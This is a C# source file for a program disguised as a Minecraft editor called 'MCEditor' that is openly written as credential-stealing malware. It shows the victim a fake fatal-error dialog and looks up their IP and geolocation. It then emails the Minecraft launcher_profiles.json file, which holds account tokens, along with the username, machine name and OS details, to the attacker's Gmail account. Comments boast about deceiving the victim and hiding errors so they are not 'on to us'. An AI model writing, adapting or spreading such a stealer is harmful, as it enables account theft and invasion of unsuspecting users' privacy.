using System;
using System.Net;
using System.Management;
using System.Net.Mail;
using System.Linq;

using System.Windows.Forms;
using System.Threading;

namespace MCEditor
{
    class Program
    {
        static string software = "MCEditor"; // Change if you want

        static void Main(string[] args)
        {
            Console.Title = software;
            Console.WriteLine("Loading..."); // To make it believable
            Thread.Sleep(2000); // To make it believable
            MessageBox.Show("There was a fatal error when starting the program.", software, MessageBoxButtons.OK); // Muhahahaha

            string ip = new WebClient().DownloadString("http://ipinfo.io/ip");
            string ipstr = String.Format("http://api.predator.wtf/geoip/?arguments={0}", ip);
            string geoip = string.Empty;
            try
            {
                geoip = new WebClient().DownloadString(String.Format("http://api.predator.wtf/geoip/?arguments={0}", ip)); // Why does this need a try block? -_-
            } catch (WebException e) { } // Let's not print the error, or they might be on to us

            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string profile = String.Format(@"{0}\.minecraft\launcher_profiles.json", appdata);

            string subject = String.Format("{0}'s Minecraft Account", Environment.UserName);

            string emailAddress = "someone@gmail.com"; // Change this
            string emailPassword = "password"; // Change this

            string userName = Environment.UserName;
            string computerName = Environment.MachineName.ToString();

            string body = String.Format("{0} has just opened {1} (And given you their details too :D)\n\n", userName, software) +
                          String.Format("Here's some info on them:\n\n") +
                          String.Format("Username: {0}\n", userName) +
                          String.Format("Computer: {0}\n", computerName) +
                          String.Format("Processor: {0}\n", Environment.Is64BitOperatingSystem ? "64 bit" : "32 bit") +
                          String.Format("Windows: {0}\n\n", GetOSVersion()) +
                          String.Format("View more info about them here: {0}\n\n", ipstr) +
                          String.Format("Additionally, the program was opened in directory {0}", Environment.CurrentDirectory);

            MailMessage message = new MailMessage(emailAddress, emailAddress, subject, body);
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);

            smtp.EnableSsl = true;
            smtp.Credentials = new NetworkCredential(emailAddress, emailPassword);

            if (profile != string.Empty || profile != null)
            {
                Attachment attach = new Attachment(profile);
                message.Attachments.Add(attach);
            }

            smtp.Send(message);
            return;
        }

        static string GetOSVersion()
        {
            var name = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                        select x.GetPropertyValue("Caption")).FirstOrDefault();
            return name != null ? name.ToString() : "Unknown";
        }
    }
}